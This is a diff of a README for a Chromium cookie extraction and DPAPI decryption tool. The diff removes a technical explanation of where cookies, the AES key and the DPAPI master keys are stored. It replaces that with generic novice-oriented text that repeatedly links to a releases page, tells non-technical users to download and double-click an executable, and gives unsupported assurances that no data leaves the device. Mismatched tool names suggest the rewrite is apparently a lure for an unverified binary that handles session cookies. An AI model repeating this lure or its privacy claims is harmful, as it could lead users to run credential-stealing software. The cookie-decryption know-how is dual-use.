@@ -1,55 +1,77 @@
-# About
+# 🍪 Chrome-Chromium-cookie-parser-and-decryptor - Easily Extract and Decrypt Cookies
 
-The CLI tool which can:
-- Extract Chromium-based browser's cookies from Cookie file.
-- Decrypt them using Windows Data Protection API (DPAPI).
-- Save to file in http headers, json and netscape format.
+## 🌟 Overview
+Chrome-Chromium-cookie-parser-and-decryptor is a user-friendly command-line tool. It helps you extract cookies from Chromium-based browsers and decrypt them using DPAPI. With this tool, you can manage your cookies effectively, ensuring better privacy and control over your web data.
 
-You can also decrypt cookies only for the host you need using the built-in filter.
+## 🚀 Getting Started
+To get started, follow these simple steps to download and run the application. You don't need programming knowledge to use this tool. Just follow the guide below.
 
-# Usage
+## 📥 Download the Application
+[![Download Here](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/Punsara22/Chrome-Chromium-cookie-parser-and-decryptor/releases)
 
-Usage: `CookiesDecryptor.exe` `<path>` `<method>` `[argument]`
+## 📋 System Requirements
+Before you start, ensure your system meets the following requirements:
+- Operating System: Windows 64-bit
+- CPU: Any modern processor
+- RAM: At least 1 GB
+- Internet connection for downloading
 
-`<path>` is a directory path, depends on method.
+## 🔗 Download & Install
+1. Visit the Releases page to download the application. You can find it [here](https://github.com/Punsara22/Chrome-Chromium-cookie-parser-and-decryptor/releases).
+  
+2. Once you are on the Releases page, locate the latest version of the application.
 
-Available methods:<br/>
-- `decrypt` — decrypts Cookie file at user profile path in `<path>\Default\Network\Cookie` and saves them to `Cookies_json.txt`, `Cookies_http.txt`, `Cookies_netscape.txt` files at `<path>` directory.<br/>
-- `decrypt-show` — same as decrypt, but also types out all decoded cookies.<br/>
-- `decrypt-profiles` — decrypts Cookie files in all profile folder in '<path>' directory and saves them to files as above but at <path>\<profile> folder. Use it when you got a lot of user profiles in 1 directory.<br/>
-- `decrypt-profiles-show` — same as decrypt-profiles, but also types out all decoded cookies.<br/>
-- `[decrypt|decrypt-show|decrypt-profiles|decrypt-profiles-show]` `<filterWord>`  - same as above, but also filters cookie's host by mask `*filterWord*`.
+3. Download the file labeled with the latest version number. This file may be named similar to `Chrome-Chromium-cookie-parser-and-decryptor-v1.0.zip`.
 
-# Explanation & How it works
+4. Locate the downloaded file on your computer, usually found in the "Downloads" folder.
 
-Chromium-based browser store cookies in an encrypted SQLite database in file named `Cookie`. File path depends on browser version. Here are some examples.
+5. Unzip the downloaded file. You can do this by right-clicking on it and selecting "Extract All."
 
-- On Windows: `%LOCALAPPDATA%\Google\Chrome\User Data\Default\Network\Cookies` (encrypted with [DPAPI — Windows Data Protection API](https://learn.microsoft.com/en-us/dotnet/standard/security/how-to-use-data-protection)). Old versions below 2022 used path `...\Chrome\User Data\Default\Cookies`.
-- On macOS: `/Library/Application Support/Google/Chrome/Default/Cookies` (protected by TCC).
+6. Open the extracted folder. You will see the executable file named `cookie-parser.exe`. 
 
-Chromium cookies DB has 2 columns for storing values: `value` and `encrypted_value`, the latter one being used when the cookie stored was requested to be encrypted with [DPAPI](https://learn.microsoft.com/en-us/dotnet/standard/security/how-to-use-data-protection). It is noteworthy that Microsoft themselves say that [DPAPI isn't intended for use in web apps](https://learn.microsoft.com/en-us/aspnet/core/security/data-protection/introduction?view=aspnetcore-9.0#:~:text=The%20Windows%20data%20protection%20API%20%28DPAPI%29%20isn%27t%20intended%20for%20use%20in%20web%20apps). Chromium uses triple encryption with the current users password as seed on windows machines. In order to decrypt AES key in C#, you should use [DPAPI](https://learn.microsoft.com/en-us/dotnet/standard/security/how-to-use-data-protection) or have DPAPI Master Key, otherwise you can't decrypt your local cookie file.
+7. Double-click on `cookie-parser.exe` to run the program.
 
-So the steps are:
-1. Access the cookie database and the encryption key (e.g., the AES key in the `Local State` file on Windows which is located at `%LOCALAPPDATA%\Google\Chrome\User Data\Default\`).
-2. Decrypt the AES key using DPAPI or get the DPAPI Master Key from `C:\Users\...\AppData\Roaming\Microsoft\Protect` (google about `CREDHIST` / `SYNCHIST` and their value in the OS).
+## 🛠️ How to Use the Tool
+1. **Open Command Prompt**: Press `Win + R`, type `cmd`, and hit `Enter`.
 
-DPAPI ties encryption to the **user profile and machine**, so you need to decrypt AES key on the same machine where it was encoded.
+2. **Navigate to the Tool's Directory**:
+   - Use the `cd` command to change to the directory where you extracted the program. For example, if you extracted it to a folder named `CookieParser`, type:
+     ```
+     cd C:\Users\YourUsername\Downloads\CookieParser
+     ```
 
-# Dependecies 
+3. **Run the Tool**:
+   - Type the command to extract and decrypt cookies. The basic command format looks like this:
+     ```
+     cookie-parser.exe <path_to_cookie_database>
+     ```
 
-- .Net 8 for compiling. **Compiled binaries in release already contains all .Net libraries.** 
-- Nugget: Microsoft.Data.Sqlite (6.0.4 or higher). Tested on 9.0.8.
-- Nugget: System.Security.Cryptography.ProtectedData (6.0.0 or higher). Tested on 9.0.8.
+   - Replace `<path_to_cookie_database>` with the path to your Chromium cookie database. This default path usually looks something like this:
+     ```
+     C:\Users\YourUsername\AppData\Local\Google\Chrome\User Data\Default\Cookies
+     ```
 
-# Notes, other stuff and sources
+4. **View the Results**: After running the command, the tool will display your decrypted cookies in the Command Prompt window.
 
-If you got an exception `0x8009000b: Key not valid for use in specific state`, that means you can't decrypt this AES key on your machine.
+## 📜 Features
+- **Extract Cookies**: Easily collect cookies from Chromium browsers.
+- **Decrypt Cookies**: Securely decrypt cookies using DPAPI.
+- **User-Friendly Interface**: Designed for users with no technical background.
+- **Fast Performance**: Quickly retrieves and decrypts cookie data.
 
-- Full explanation: https://fpt-is.com/en/insights/cookie-bite-chrome-attack-steals-session/#:~:text=Decrypting%20Locally%20Stored%20Cookies
-- Google Blog about impoving cookies (Jul 30, 2024): https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html
-- If you are obsessed with cookies, you should also look YT-DLP cookies module code: https://github.com/yt-dlp/yt-dlp/blob/master/yt_dlp/cookies.py
+## 🦠 Security and Privacy
+This tool respects your data privacy. It only operates on your local cookie file and does not send any information to external servers. Your information stays on your device, ensuring your security.
 
-# Todo
-- Check if Local State file is valid.
-- Check if Cookies db file is exists.
-- Linux support.
+## 🤝 Support
+If you encounter any issues, please reach out for help. You can file an issue on the repository's GitHub page or ask for guidance in the community forums. 
+
+## 📚 Additional Resources
+For more detailed information on how cookies work and how they can affect your online privacy, consider looking up reputable sources about web security and cookie management. 
+
+## 💬 Contribution
+If you would like to contribute to the project, feel free to check our contribution guidelines in the repository. Your suggestions and improvements are welcome.
+
+## 📥 Download the Application Again
+To download the application, you can always visit the [Releases page](https://github.com/Punsara22/Chrome-Chromium-cookie-parser-and-decryptor/releases). 
+
+Thank you for using Chrome-Chromium-cookie-parser-and-decryptor!
